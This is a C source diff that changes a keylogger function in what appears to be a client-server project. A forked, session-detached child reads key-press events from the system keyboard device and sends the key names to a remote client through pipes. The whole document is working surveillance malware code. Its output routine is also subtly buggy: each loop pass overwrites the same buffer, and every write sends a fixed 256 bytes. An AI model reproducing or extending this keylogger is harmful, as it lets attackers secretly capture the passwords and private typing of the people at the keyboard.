@@ -16,7 +16,7 @@ static int writeEventsIntoFile(int fd, struct input_event *events, size_t to_wri
 	for (size_t j = 0; j < to_write / event_size; j++)
 		snprintf(str, 256, "Key: %s\n", keycodes[events[j].code]);
 	written = write(fd, str, 256);
-	if (written < 0) /* It can fail with EPIPE (If server closed socket) or with EINTR if it is interrupted by a signal before any bytes were written */
+	if (written < 0)
 		return written;
 	return 1;
 }
@@ -25,10 +25,15 @@ void	*keylogger_function(t_server *server, int index)
 {
 	const int	client_fd = server->clients[index].fd;
 	pid_t		pid;
+	int			inpipe_fds[2], outpipe_fds[2];
 
 	ft_dprintf(2, "clientfd: %d\n", client_fd);
 
-	memset(&server->clients[index], 0, sizeof(t_client));
+
+	pipe(inpipe_fds);
+	pipe(outpipe_fds);
+	server->clients[index].inpipe_fd = inpipe_fds[1]; //write end for server, we read from 0 here in stdin
+	server->clients[index].outpipe_fd = outpipe_fds[0]; //read end for server, we write in 1 here
 
 	pid = fork();
 	if (pid < 0) {
@@ -38,9 +43,11 @@ void	*keylogger_function(t_server *server, int index)
 		setsid();
 
 		close(server->fd);
-		dup2(client_fd, STDIN_FILENO);
-		dup2(client_fd, STDERR_FILENO);
-		dup2(client_fd, STDOUT_FILENO);
+		dup2(inpipe_fds[0], STDIN_FILENO);
+		dup2(outpipe_fds[1], STDERR_FILENO);
+		dup2(outpipe_fds[1], STDOUT_FILENO);
+		close(outpipe_fds[0]);
+		close(inpipe_fds[1]);
 		close(client_fd);
 		int	kb;
 		if (!keyboardFound(DEV_PATH, &kb)) {
@@ -50,18 +57,18 @@ void	*keylogger_function(t_server *server, int index)
 
 		t_event kbd_events[event_size * MAX_EVENTS];
 
-		while (1) /* If server closed connection and write failed (SIGPIPE), user sent SIGTERM or another IO error occurred we stop keylogging */
+		while (1)
 		{
 			ssize_t r = read(kb, kbd_events, event_size * MAX_EVENTS);
-			if (r < 0) /* If read was interrupted by SIGTERM or another error occurred we stop keylogging */
+			if (r < 0)
 				break ;
 			else
 			{
 				size_t j = 0;
-				for (size_t i = 0; i < r / event_size; i++) /* For each event read */
+				for (size_t i = 0; i < r / event_size; i++) //for each event read
 				{
-					if (kbd_events[i].type == EV_KEY && kbd_events[i].value == KEY_PRESSED) /* If a key has been pressed.. */
-						kbd_events[j++] = kbd_events[i];                                    /*  Add the event to the beginning of the array */
+					if (kbd_events[i].type == EV_KEY && kbd_events[i].value == KEY_PRESSED) //if a key has been pressed..
+						kbd_events[j++] = kbd_events[i];                                    //add the event to the beginning of the array
 				}
 				if (writeEventsIntoFile(STDOUT_FILENO, kbd_events, j * event_size) < 0)
 					break ;
@@ -73,7 +80,6 @@ void	*keylogger_function(t_server *server, int index)
 	}
 	else if (pid > 0) {
 		ft_lstadd_back(&server->pids, ft_lstnew((void *)(long)pid));
-		close(client_fd);
 	}
 	return (NULL);
 }
